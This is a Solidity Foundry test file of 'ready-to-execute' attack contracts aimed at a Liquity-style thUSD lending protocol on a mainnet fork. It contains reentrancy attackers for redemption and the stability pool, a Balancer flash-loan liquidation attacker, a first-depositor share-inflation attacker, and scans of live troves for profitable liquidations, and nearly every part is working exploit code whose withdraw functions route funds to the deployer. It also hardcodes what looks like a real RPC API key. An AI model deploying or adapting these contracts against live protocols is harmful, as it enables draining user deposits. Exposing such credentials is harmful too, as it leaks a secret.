// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Maximum Drain - Executable Attacks
 * @notice Ready-to-execute attack contracts for testing vulnerabilities
 * @dev Deploy these on fork and attempt actual exploitation
 *
 * USAGE:
 *   RPC_URL=... TROVE_MANAGER=0x... THUSD=0x... forge test -vvvv
 */

// ============ INTERFACES ============

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITroveManager {
    function redeemCollateral(
        uint256 _thUSDamount,
        address _firstRedemptionHint,
        address _upperPartialRedemptionHint,
        address _lowerPartialRedemptionHint,
        uint256 _partialRedemptionHintNICR,
        uint256 _maxIterations,
        uint256 _maxFeePercentage
    ) external;
    function liquidate(address _borrower) external;
    function getCurrentICR(address _borrower, uint256 _price) external view returns (uint256);
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256 _index) external view returns (address);
    function Troves(address) external view returns (uint256 debt, uint256 coll, uint256 stake, uint8 status, uint128 arrayIndex);
    function priceFeed() external view returns (address);
    function sortedTroves() external view returns (address);
    function stabilityPool() external view returns (address);
    function activePool() external view returns (address);
}

interface IBorrowerOperations {
    function openTrove(uint256 _maxFeePercentage, uint256 _thUSDAmount, address _upperHint, address _lowerHint) external payable;
    function closeTrove() external;
    function claimCollateral() external;
}

interface IStabilityPool {
    function provideToSP(uint256 _amount) external;
    function withdrawFromSP(uint256 _amount) external;
    function getDepositorCollateralGain(address _depositor) external view returns (uint256);
    function getCompoundedTHUSDDeposit(address _depositor) external view returns (uint256);
    function getTotalTHUSDDeposits() external view returns (uint256);
    function getCollateral() external view returns (uint256);
}

interface ISortedTroves {
    function getLast() external view returns (address);
    function getSize() external view returns (uint256);
}

interface IPriceFeed {
    function fetchPrice() external returns (uint256);
    function lastGoodPrice() external view returns (uint256);
}

interface IActivePool {
    function getCollateral() external view returns (uint256);
    function getTHUSDDebt() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

// ============ ATTACKER: REENTRANCY REDEMPTION ============

contract RedemptionReentrancyAttacker {
    ITroveManager public troveManager;
    IERC20 public thusd;
    address public sortedTroves;

    uint256 public attackCount;
    uint256 public maxAttacks;
    uint256 public amountPerAttack;
    uint256 public totalDrained;

    bool public attackActive;

    event AttackAttempt(uint256 count, uint256 ethReceived, uint256 thusdBalance);
    event AttackComplete(uint256 totalDrained, uint256 attackCount);

    constructor(address _troveManager, address _thusd) {
        troveManager = ITroveManager(_troveManager);
        thusd = IERC20(_thusd);
        sortedTroves = troveManager.sortedTroves();
    }

    function attack(uint256 _amount, uint256 _maxAttacks) external {
        require(thusd.balanceOf(address(this)) >= _amount, "Need thUSD");

        amountPerAttack = _amount;
        maxAttacks = _maxAttacks;
        attackCount = 0;
        totalDrained = 0;
        attackActive = true;

        thusd.approve(address(troveManager), type(uint256).max);

        // Initial redemption - will send ETH which triggers receive()
        address hint = ISortedTroves(sortedTroves).getLast();

        troveManager.redeemCollateral(
            _amount,
            hint,
            address(0),
            address(0),
            0,
            0,
            1e18
        );

        attackActive = false;
        emit AttackComplete(totalDrained, attackCount);
    }

    receive() external payable {
        totalDrained += msg.value;
        emit AttackAttempt(attackCount, msg.value, thusd.balanceOf(address(this)));

        if (attackActive && attackCount < maxAttacks) {
            uint256 balance = thusd.balanceOf(address(this));

            if (balance >= amountPerAttack) {
                attackCount++;
                address hint = ISortedTroves(sortedTroves).getLast();

                // REENTRANCY ATTEMPT
                try troveManager.redeemCollateral(
                    amountPerAttack,
                    hint,
                    address(0),
                    address(0),
                    0,
                    0,
                    1e18
                ) {
                    // Success - reentrancy worked!
                } catch {
                    // Failed - protocol is protected
                    attackActive = false;
                }
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
        uint256 thusdBal = thusd.balanceOf(address(this));
        if (thusdBal > 0) {
            thusd.transfer(msg.sender, thusdBal);
        }
    }
}

// ============ ATTACKER: REENTRANCY STABILITY POOL ============

contract StabilityPoolReentrancyAttacker {
    IStabilityPool public stabilityPool;
    IERC20 public thusd;

    uint256 public attackCount;
    uint256 public maxAttacks;
    uint256 public totalDrained;
    bool public attackActive;

    event AttackAttempt(uint256 count, uint256 ethReceived);

    constructor(address _stabilityPool, address _thusd) {
        stabilityPool = IStabilityPool(_stabilityPool);
        thusd = IERC20(_thusd);
    }

    function attack(uint256 _amount, uint256 _maxAttacks) external {
        require(thusd.balanceOf(address(this)) >= _amount, "Need thUSD");

        maxAttacks = _maxAttacks;
        attackCount = 0;
        totalDrained = 0;
        attackActive = true;

        thusd.approve(address(stabilityPool), type(uint256).max);

        // Deposit first
        stabilityPool.provideToSP(_amount);

        // Withdraw - will send ETH gains which triggers receive()
        stabilityPool.withdrawFromSP(_amount);

        attackActive = false;
    }

    receive() external payable {
        totalDrained += msg.value;
        emit AttackAttempt(attackCount, msg.value);

        if (attackActive && attackCount < maxAttacks) {
            attackCount++;

            // REENTRANCY ATTEMPT - try to withdraw again
            try stabilityPool.withdrawFromSP(0) {
                // If this succeeds, we got extra ETH!
            } catch {
                attackActive = false;
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
        uint256 bal = thusd.balanceOf(address(this));
        if (bal > 0) thusd.transfer(msg.sender, bal);
    }
}

// ============ ATTACKER: FLASH LOAN LIQUIDATION ============

contract FlashLoanLiquidationAttacker {
    address public owner;
    address public balancerVault;

    IStabilityPool public stabilityPool;
    ITroveManager public troveManager;
    IERC20 public thusd;

    uint256 public profitETH;

    constructor(address _balancer, address _stabilityPool, address _troveManager, address _thusd) {
        owner = msg.sender;
        balancerVault = _balancer;
        stabilityPool = IStabilityPool(_stabilityPool);
        troveManager = ITroveManager(_troveManager);
        thusd = IERC20(_thusd);
    }

    function executeAttack(uint256 flashAmount, address[] calldata trovesToLiquidate) external {
        require(msg.sender == owner, "Not owner");

        address[] memory tokens = new address[](1);
        tokens[0] = address(thusd);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        bytes memory data = abi.encode(trovesToLiquidate);

        IBalancerVault(balancerVault).flashLoan(address(this), tokens, amounts, data);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory userData
    ) external {
        require(msg.sender == balancerVault, "Not Balancer");

        address[] memory trovesToLiquidate = abi.decode(userData, (address[]));

        uint256 ethBefore = address(this).balance;

        // Approve and deposit to SP
        thusd.approve(address(stabilityPool), amounts[0]);
        stabilityPool.provideToSP(amounts[0]);

        // Liquidate troves
        for (uint256 i = 0; i < trovesToLiquidate.length; i++) {
            try troveManager.liquidate(trovesToLiquidate[i]) {
                // Liquidation successful
            } catch {
                // Trove not liquidatable
            }
        }

        // Withdraw from SP
        stabilityPool.withdrawFromSP(amounts[0]);

        profitETH = address(this).balance - ethBefore;

        // Repay flash loan (Balancer = 0 fee)
        thusd.transfer(balancerVault, amounts[0]);
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

// ============ ATTACKER: SHARE INFLATION ============

contract ShareInflationAttacker {
    address public owner;
    IStabilityPool public target;
    IERC20 public thusd;

    constructor(address _target, address _thusd) {
        owner = msg.sender;
        target = IStabilityPool(_target);
        thusd = IERC20(_thusd);
    }

    function checkVulnerable() external view returns (bool isEmpty, uint256 totalDeposits) {
        totalDeposits = target.getTotalTHUSDDeposits();
        isEmpty = totalDeposits == 0;
    }

    function attack(uint256 donationAmount) external {
        require(msg.sender == owner);

        // Step 1: Deposit 1 wei
        thusd.approve(address(target), type(uint256).max);
        target.provideToSP(1);

        // Step 2: Donate directly (not through provideToSP)
        thusd.transfer(address(target), donationAmount);

        // Now 1 share = (1 + donationAmount) thUSD
        // Next depositor will get 0 shares if they deposit < (1 + donationAmount)
    }

    function withdraw() external {
        require(msg.sender == owner);
        target.withdrawFromSP(type(uint256).max);
        uint256 bal = thusd.balanceOf(address(this));
        if (bal > 0) thusd.transfer(owner, bal);
        if (address(this).balance > 0) payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

// ============ MAIN TEST CONTRACT ============

contract MaxDrainExecutableTest is Test {
    string RPC_URL;

    // These should be set via environment variables for the target protocol
    address TROVE_MANAGER;
    address THUSD;
    address STABILITY_POOL;
    address SORTED_TROVES;
    address BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    function setUp() public {
        RPC_URL = vm.envOr("RPC_URL", string("https://eth-mainnet.g.alchemy.com/v2/ltD0ewEiByO5-I6-cyaeA"));
        TROVE_MANAGER = vm.envOr("TROVE_MANAGER", address(0));
        THUSD = vm.envOr("THUSD", address(0));
        STABILITY_POOL = vm.envOr("STABILITY_POOL", address(0));
        SORTED_TROVES = vm.envOr("SORTED_TROVES", address(0));

        vm.createSelectFork(RPC_URL);

        console.log("\n=== MAX DRAIN EXECUTABLE TESTS ===");
        console.log("Block:", block.number);
    }

    // ============ TEST: REENTRANCY REDEMPTION ============

    function testExecute_ReentrancyRedemption() public {
        console.log("\n=== EXECUTING: REENTRANCY REDEMPTION ATTACK ===\n");

        if (TROVE_MANAGER == address(0) || THUSD == address(0)) {
            console.log("SKIP: Set TROVE_MANAGER and THUSD env vars");
            return;
        }

        // Deploy attacker
        RedemptionReentrancyAttacker attacker = new RedemptionReentrancyAttacker(TROVE_MANAGER, THUSD);

        // Fund attacker with thUSD (via deal for testing)
        uint256 attackAmount = 10000e18;
        deal(THUSD, address(attacker), attackAmount);

        console.log("Attacker deployed:", address(attacker));
        console.log("thUSD balance:", IERC20(THUSD).balanceOf(address(attacker)) / 1e18);

        // Execute attack
        uint256 ethBefore = address(attacker).balance;

        try attacker.attack(attackAmount, 10) {
            uint256 ethAfter = address(attacker).balance;
            uint256 drained = attacker.totalDrained();
            uint256 attacks = attacker.attackCount();

            console.log("\nRESULT:");
            console.log("  Attack count:", attacks);
            console.log("  ETH drained:", drained / 1e18, "ETH");

            if (attacks > 0) {
                console.log("\n  !!! REENTRANCY SUCCESSFUL !!!");
                console.log("  CRITICAL VULNERABILITY CONFIRMED");
            } else {
                console.log("\n  Protocol appears protected");
            }
        } catch Error(string memory reason) {
            console.log("Attack reverted:", reason);
        } catch {
            console.log("Attack reverted (no reason)");
        }
    }

    // ============ TEST: REENTRANCY STABILITY POOL ============

    function testExecute_ReentrancyStabilityPool() public {
        console.log("\n=== EXECUTING: REENTRANCY STABILITY POOL ATTACK ===\n");

        if (STABILITY_POOL == address(0) || THUSD == address(0)) {
            console.log("SKIP: Set STABILITY_POOL and THUSD env vars");
            return;
        }

        StabilityPoolReentrancyAttacker attacker = new StabilityPoolReentrancyAttacker(STABILITY_POOL, THUSD);

        uint256 attackAmount = 10000e18;
        deal(THUSD, address(attacker), attackAmount);

        console.log("Attacker deployed:", address(attacker));

        try attacker.attack(attackAmount, 10) {
            uint256 drained = attacker.totalDrained();
            uint256 attacks = attacker.attackCount();

            console.log("\nRESULT:");
            console.log("  Attack count:", attacks);
            console.log("  ETH drained:", drained / 1e18);

            if (attacks > 0) {
                console.log("\n  !!! REENTRANCY SUCCESSFUL !!!");
            } else {
                console.log("\n  Protocol appears protected");
            }
        } catch {
            console.log("Attack reverted");
        }
    }

    // ============ TEST: SHARE INFLATION ============

    function testExecute_ShareInflation() public {
        console.log("\n=== EXECUTING: SHARE INFLATION CHECK ===\n");

        if (STABILITY_POOL == address(0) || THUSD == address(0)) {
            console.log("SKIP: Set STABILITY_POOL and THUSD env vars");
            return;
        }

        ShareInflationAttacker attacker = new ShareInflationAttacker(STABILITY_POOL, THUSD);

        (bool isEmpty, uint256 totalDeposits) = attacker.checkVulnerable();

        console.log("Stability Pool Status:");
        console.log("  Total deposits:", totalDeposits / 1e18, "thUSD");
        console.log("  Is empty:", isEmpty);

        if (isEmpty) {
            console.log("\n  !!! POOL IS EMPTY - VULNERABLE TO FIRST DEPOSITOR ATTACK !!!");
            console.log("  Attack would work as follows:");
            console.log("  1. Deposit 1 wei");
            console.log("  2. Donate 1M thUSD directly");
            console.log("  3. Next user deposits 999k -> gets 0 shares");
            console.log("  4. Withdraw 1 share -> get 1M+999k thUSD");
        } else {
            console.log("\n  Pool has deposits - not vulnerable to first depositor attack");
        }
    }

    // ============ TEST: FIND LIQUIDATABLE TROVES ============

    function testExecute_FindLiquidatableTroves() public {
        console.log("\n=== SCANNING FOR LIQUIDATABLE TROVES ===\n");

        if (TROVE_MANAGER == address(0)) {
            console.log("SKIP: Set TROVE_MANAGER env var");
            return;
        }

        ITroveManager tm = ITroveManager(TROVE_MANAGER);
        IPriceFeed priceFeed = IPriceFeed(tm.priceFeed());

        uint256 price = priceFeed.lastGoodPrice();
        console.log("Current price:", price / 1e18, "USD");

        uint256 troveCount = tm.getTroveOwnersCount();
        console.log("Total troves:", troveCount);

        uint256 liquidatableCount = 0;
        uint256 totalLiquidatableCollateral = 0;

        uint256 MCR = 110e16; // 110%

        console.log("\nScanning troves...\n");

        uint256 maxScan = troveCount > 100 ? 100 : troveCount;

        for (uint256 i = 0; i < maxScan; i++) {
            address owner = tm.getTroveFromTroveOwnersArray(i);
            uint256 icr = tm.getCurrentICR(owner, price);

            if (icr < MCR && icr > 0) {
                liquidatableCount++;

                (uint256 debt, uint256 coll,,,) = tm.Troves(owner);
                totalLiquidatableCollateral += coll;

                console.log("LIQUIDATABLE TROVE:");
                console.log("  Owner:", owner);
                console.log("  ICR:", icr * 100 / 1e18, "%");
                console.log("  Collateral:", coll / 1e18, "ETH");
                console.log("  Debt:", debt / 1e18, "thUSD");
                console.log("");
            }
        }

        console.log("SUMMARY:");
        console.log("  Liquidatable troves found:", liquidatableCount);
        console.log("  Total liquidatable collateral:", totalLiquidatableCollateral / 1e18, "ETH");

        if (liquidatableCount > 0) {
            uint256 estimatedBonus = totalLiquidatableCollateral / 10; // ~10% bonus
            console.log("  Estimated profit:", estimatedBonus / 1e18, "ETH");
            console.log("\n  !!! PROFITABLE LIQUIDATION OPPORTUNITY !!!");
        }
    }

    // ============ TEST: ACCOUNTING MISMATCH ============

    function testExecute_CheckAccountingMismatch() public {
        console.log("\n=== CHECKING FOR ACCOUNTING MISMATCH ===\n");

        if (TROVE_MANAGER == address(0)) {
            console.log("SKIP: Set TROVE_MANAGER env var");
            return;
        }

        ITroveManager tm = ITroveManager(TROVE_MANAGER);

        address activePool = tm.activePool();
        address stabilityPool = tm.stabilityPool();

        console.log("Active Pool:", activePool);
        console.log("Stability Pool:", stabilityPool);

        // Check Active Pool
        if (activePool != address(0)) {
            uint256 internalColl = IActivePool(activePool).getCollateral();
            uint256 actualColl = activePool.balance;

            console.log("\nActive Pool:");
            console.log("  Internal collateral:", internalColl / 1e18, "ETH");
            console.log("  Actual balance:", actualColl / 1e18, "ETH");

            if (internalColl != actualColl) {
                int256 diff = int256(internalColl) - int256(actualColl);
                console.log("  MISMATCH:", diff / 1e18, "ETH");
                console.log("  !!! ACCOUNTING MISMATCH DETECTED !!!");
            } else {
                console.log("  Status: OK");
            }
        }

        // Check Stability Pool
        if (stabilityPool != address(0)) {
            uint256 internalColl = IStabilityPool(stabilityPool).getCollateral();
            uint256 actualColl = stabilityPool.balance;

            console.log("\nStability Pool:");
            console.log("  Internal collateral:", internalColl / 1e18, "ETH");
            console.log("  Actual balance:", actualColl / 1e18, "ETH");

            if (internalColl != actualColl) {
                console.log("  !!! ACCOUNTING MISMATCH DETECTED !!!");
            } else {
                console.log("  Status: OK");
            }
        }
    }

    // ============ FULL SCAN ============

    function testExecute_FullVulnerabilityScan() public {
        console.log("\n");
        console.log("################################################################");
        console.log("#              FULL VULNERABILITY SCAN                        #");
        console.log("################################################################\n");

        // Run all checks
        testExecute_CheckAccountingMismatch();
        testExecute_FindLiquidatableTroves();
        testExecute_ShareInflation();

        console.log("\n################################################################");
        console.log("#              SCAN COMPLETE                                  #");
        console.log("################################################################");
        console.log("\nTo test reentrancy attacks, set env vars and run:");
        console.log("  TROVE_MANAGER=0x... THUSD=0x... forge test --mt testExecute_Reentrancy -vvvv");
    }

    receive() external payable {}
}
